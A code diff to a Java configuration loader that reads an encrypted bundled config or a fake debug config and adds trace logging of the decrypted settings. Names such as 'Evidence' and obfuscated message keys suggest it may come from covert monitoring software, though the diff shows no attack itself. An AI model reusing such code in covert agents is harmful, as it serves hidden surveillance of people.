@@ -71,7 +71,7 @@ public final class ConfLoader {
 
             if (loaded) {
                 //#ifdef DEBUG
-                debug.info("New config"); //$NON-NLS-1$
+                debug.info("loadConf, new config"); //$NON-NLS-1$
                 //#endif
                 file.rename(Cfg.ACTUAL_CONF, true);
                 Evidence.info(Messages.getString("r.0")); //$NON-NLS-1$
@@ -88,6 +88,9 @@ public final class ConfLoader {
         if (!loaded) {
             file = new AutoFile(Path.conf(), Cfg.ACTUAL_CONF);
             if (file.exists()) {
+                //#ifdef DEBUG
+                debug.info("loadConf, actual conf");
+                //#endif
                 loaded = loadConfFile(file, true);
                 if (!loaded) {
                     Evidence.info(Messages.getString("r.2")); //$NON-NLS-1$
@@ -97,6 +100,7 @@ public final class ConfLoader {
 
         //#ifdef FAKECONF
         if (!loaded) {
+
             cleanConfiguration();
             String json = InstanceConfigFake.getJson();
             // Initialize the configuration object
@@ -110,7 +114,7 @@ public final class ConfLoader {
 
         if (!loaded) {
             //#ifdef DEBUG
-            debug.warn("Reading Conf from resources"); //$NON-NLS-1$
+            debug.info("loadConf, reading conf from resources"); //$NON-NLS-1$
             //#endif
 
             Configuration conf;
@@ -125,9 +129,20 @@ public final class ConfLoader {
                 byte[] resource = Utils.inputStreamToBuffer(inputStream); // config.bin
                 int len = Utils.byteArrayToInt(resource, 0);
 
+                //#ifdef DEBUG
+                debug.trace("loadConf, len: " + len);
+                //debug.trace(" conf: " + Utils.byteArrayToHex(resource));
+                //#endif
+                
+                byte[] cyphered = new byte[len];
+                Utils.copy(cyphered,0, resource, 4, len);
                 // Initialize the configuration object
-                conf = new Configuration(resource, len, 4);
+                conf = new Configuration(cyphered,len,0);
 
+                //#ifdef DEBUG
+                debug.trace("loadConf: " + conf.getJson());
+                //#endif
+                
                 // Load the configuration
                 loaded = conf.loadConfiguration(true);
 
